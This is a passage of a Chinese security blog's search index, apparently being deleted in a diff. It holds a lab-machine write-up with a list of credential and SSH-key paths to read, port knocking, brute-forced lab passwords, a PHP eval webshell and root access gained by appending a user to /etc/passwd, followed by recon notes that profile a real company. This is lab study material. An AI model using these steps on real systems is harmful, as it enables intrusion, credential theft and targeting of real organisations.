class="line">&#x2F;var&#x2F;mail&#x2F;root</span><br><span class="line">&#x2F;var&#x2F;mysql.log</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;mail&#x2F;root</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;index.html</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;index.php</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;logs&#x2F;error_log</span><br><span class="line">&#x2F;web&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;www&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;www&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;www&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;www&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;www&#x2F;php5&#x2F;php.ini</span><br><span class="line">&#x2F;xampp&#x2F;apache&#x2F;bin&#x2F;php.ini</span><br><span class="line">&#x2F;xampp&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">root&#x2F;.ssh&#x2F;identity</span><br><span class="line">root&#x2F;.ssh&#x2F;identity.pub</span><br><span class="line">root&#x2F;.ssh&#x2F;id_dsa</span><br><span class="line">root&#x2F;.ssh&#x2F;id_dsa.pub</span><br><span class="line">root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">root&#x2F;.ssh&#x2F;id_rsa.pub</span><br></pre></td></tr></table></figure>
-<p>丢bp里爆破，也没找到什么东西，</p>
-<h2 id="knockd，ssh连接getshell"><a href="#knockd，ssh连接getshell" class="headerlink" title="knockd，ssh连接getshell"></a>knockd，ssh连接getshell</h2><p>还是去看别人的过程，要读</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;etc&#x2F;knockd.conf</span><br></pre></td></tr></table></figure>
-<p>这个文件，然后去查了一下这个玩意，大概是，要先访问sequence指定的端口，才会打开或者关闭对应的端口<br>比如这里，</p>
-<p><img src="image-20210618103630995.png" alt="image-20210618103630995"></p>
-<p>openSSH下面的sequence指定了7469,8475,9842三个端口，在不访问这几个端口前，直接ssh连接过去，是会被拒绝的</p>
-<p><img src="image-20210618103806549.png" alt="image-20210618103806549"></p>
-<p>但访问了这些端口后，这里我用的telnet</p>
-<p>telnet 192.168.243.135 7469<br>telnet 192.168.243.135 8475<br>telnet 192.168.243.135 9842</p>
-<p><img src="image-20210618103838621.png" alt="image-20210618103838621"></p>
-<p><img src="image-20210618103858499.png" alt="image-20210618103858499"></p>
-<p>就可以正常连接ssh（虽然现在还是不知道密码）<br>然后就去hydra里用找到的账号密码去爆破ssh密码了<br>[22][ssh] host: 192.168.243.135   login: chandlerb   password: UrAG0D!<br>[22][ssh] host: 192.168.243.135   login: joeyt   password: Passw0rd<br>[22][ssh] host: 192.168.243.135   login: janitor   password: Ilovepeepee</p>
-<p>chandlerb<br>UrAG0D!</p>
-<p>joeyt<br>Passw0rd</p>
-<p>janitor<br>Ilovepeepee</p>
-<p>在/var/www/html/config.php里找到了数据库密码<br>dbuser<br>password<br>没啥用的样子，<br>在/opt/devstuff下面发现有个python文件</p>
-<p><img src="image-20210618130546428.png" alt="image-20210618130546428"></p>
-<p>可以读写文件，试了一下写一个一句话到/var/html/www/bak<br>echo “<?php @eval($_POST[cmd]); ?>“ &gt; /tmp/shell.php<br>python test.py /tmp/shell.php  /var/www/html/bak.manage.php</p>
-<p><img src="image-20210618133819795.png" alt="image-20210618133819795"></p>
-<p>报错了。</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在janitor下面发现了一个文本文件，里面有些密码</p>
-<p><img src="image-20210618133916295.png" alt="image-20210618133916295"></p>
-<p>拿出来，再去爆破一下，出来一个新用户，<br>[22][ssh] host: 192.168.243.135   login: fredf   password: B4-Tru3-001<br>fredf<br>B4-Tru3-001<br>果然，sudo -l发现它可以不用密码用sudo执行一个test文件，这里的看文件结构，应该是把test.py打包成了可执行文件，</p>
-<p>这样子就可以向任意文件写入数据了<br>sudo ./test /tmp/shell.php  /var/www/html/bak.manage.php</p>
-<p>所以这里我在tmp目录下写了一个shell。然后用test把它写入到index.php中，再用蚁剑连接上去</p>
-<p><img src="image-20210618144957050.png" alt="image-20210618144957050"></p>
-<p>(发现多此一举。: p)</p>
-<p>直接写入一个用户到passwd文件里就行<br>    openssl password -1 -salt admin2 admin2</p>
-<pre><code>$1$admin2$Pr1254RlLuWxoieYEI.Sa0
-</code></pre>
-<p>拼接好数据后，写入到/tmp/get文件里，（只有这里可以任意写文件）<br>    echo ‘admin2:$1$admin2$Pr1254RlLuWxoieYEI.Sa0:0:0::/:/bin/bash’ &gt; /tmp/get</p>
-<p>然后用test写入到passwd<br>    sudo /opt/devstuff/dist/test/test /tmp/get /etc/passwd</p>
-<p>之后直接su admin2<br>切换过去，就可以看到flag了</p>
-<p><img src="image-20210618155522983.png" alt="image-20210618155522983"></p>
-<p>可能是因为是最后一个靶机，最后的结束语都有些不一样</p>
-<p>So long, and thanks for all the fish.</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>由于粗心，注入的时候没有第一时间找到各个用户的密码，导致后面ssh爆破的时候傻乎乎的花了很多时间，过于粗心。文件包含这个很早就注意过了，但是却没有想到去文件包含（他已经考过一次），后面提权的时候，直接写入passwd文件创建用户，这一点以前没有碰过。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>信息搜集</title>
-    <url>/2021/06/04/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
-    <content><![CDATA[<p>freebuf：<a class="link" href="https://www.freebuf.com/articles/web/190403.html">https://www.freebuf.com/articles/web/190403.html<i class="fas fa-external-link-alt"></i></a><br><img src="1543072448_5bf96ac069a0b.png" alt="1543072448_5bf96ac069a0b"></p>
-<h2 id="信息搜集内容"><a href="#信息搜集内容" class="headerlink" title="信息搜集内容"></a>信息搜集内容</h2><ul>
-<li>服务器信息(端口、服务、IP)</li>
-<li>网站信息（服务器操作系统、中间件、数据库、编程语言、敏感目录与文件、旁站查询、C段查询）</li>
-<li>域名信息( whois、备案信息、子域名收集)</li>
-<li>网站管理员信息(姓名、职务、生日、联系电话、邮件地址)</li>
-</ul>
-<p>判断CDN<br>    多地ping<br>        <a class="link" href="http://ping.chinaz.com/">http://ping.chinaz.com/<i class="fas fa-external-link-alt"></i></a> 站长之家ping测试在最后有国外的服务器<br>        <a class="link" href="https://www.wepcc.com/">https://www.wepcc.com/<i class="fas fa-external-link-alt"></i></a></p>
-<p>绕过CDN<br>CDN按流浪计费，可能不在境外使用，或者它的边缘业务（子域名）不会架设CDN服务</p>
-<ul>
-<li>国外PING</li>
-<li>子域名PING（子域名在同一个服务器或者C段）</li>
-<li>邮件服务器（子域名在同一个服务器或者C段）</li>
-<li>DNS解析记录（从前没钱挂CDN，IP被记录下来了）<br>  <a class="link" href="https://site.ip138.com/">https://site.ip138.com<i class="fas fa-external-link-alt"></i></a> （推荐）<br>  <a class="link" href="https://viewdns.info/history">https://viewdns.info/history<i class="fas fa-external-link-alt"></i></a> （推荐）<br>  <a class="link" href="https://securitytrails.com/">https://securitytrails.com/<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-<p>子域名查询：</p>
-<ul>
-<li><p>oneforall  <a class="link" href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll<i class="fas fa-external-link-alt"></i></a></p>
-</li>
-<li><p>证书查询 </p>
-<p>   <a class="link" href="https://myssl.com/">https://myssl.com/<i class="fas fa-external-link-alt"></i></a><br>   <a class="link" href="https://search.censys.io/">https://search.censys.io/<i class="fas fa-external-link-alt"></i></a><br>   <a class="link" href="https://crt.sh/?Identity=">https://crt.sh/?Identity=<i class="fas fa-external-link-alt"></i></a><br>   <a class="link" href="https://spyse.com/">https://spyse.com/<i class="fas fa-external-link-alt"></i></a>  查子域名收费</p>
-</li>
-</ul>
-<p>以默安为例子</p>
-<p>公司全称叫：杭州默安科技有限公司<br>官网：<a class="link" href="https://www.moresec.cn/">https://www.moresec.cn/<i class="fas fa-external-link-alt"></i></a></p>
-<p>在企查查上查到对外投资四家公司<br>    北京默安科技有限公司<br>    深圳默安科技有限公司<br>    上海默知安科技有限公司<br>    长沙火线云网络科技有限公司</p>
-<p><img src="image-20210604153232318.png" alt="image-20210604153232318"></p>
-<p>查电话查到另一家公司  0571-57890068<br>    杭州云中盟股权投资合伙企业（有限合伙）</p>
-<p>留个坑</p>
-]]></content>
   </entry>
 </search>
